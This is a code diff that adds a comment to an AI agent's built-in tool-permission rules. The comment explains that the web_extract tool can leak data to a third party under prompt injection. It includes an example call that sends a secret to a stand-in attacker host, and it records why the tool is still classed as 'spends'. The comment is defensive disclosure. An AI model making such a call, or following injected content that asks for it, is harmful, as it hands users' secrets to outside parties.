@@ -163,6 +163,22 @@ export const BUILTIN_RULES: readonly PolicyRule[] = [
   // and no rule GATES it", which is still exactly true; declaring an effect is
   // a disclosure, not a gate, so promoting these to `'rule'` would overstate
   // how much the permission itself was deliberated.
+  //
+  // WEB_EXTRACT IS ALSO AN EXFILTRATION CHANNEL, and `spends` does not say so.
+  // `url-guard.ts` refuses only localhost/.local/.internal, so any PUBLIC URL
+  // the agent names is fetched — and under prompt injection (untrusted content
+  // is the normal case on this surface, invariant 5)
+  // `web_extract('https://attacker.example/?x=<secret>')` hands data to a
+  // third party that sees the request, unrecoverably. By the definition in
+  // `ToolEffect` that is `outward`.
+  //
+  // It is filed as `spends` anyway, and that is a deliberate, narrow choice
+  // rather than a judgement that it is safe: marking it `outward` makes the
+  // lint force a hold on every page read, which is a UX decision about a live
+  // deployment and not one to smuggle in under a classification change.
+  // TASK-330 carries the decision. Flagged here, in the table, because the
+  // alternative is a rule that reads as though someone concluded it was
+  // harmless.
   {
     id: 'web.search',
     match: { tool: 'web_search' },
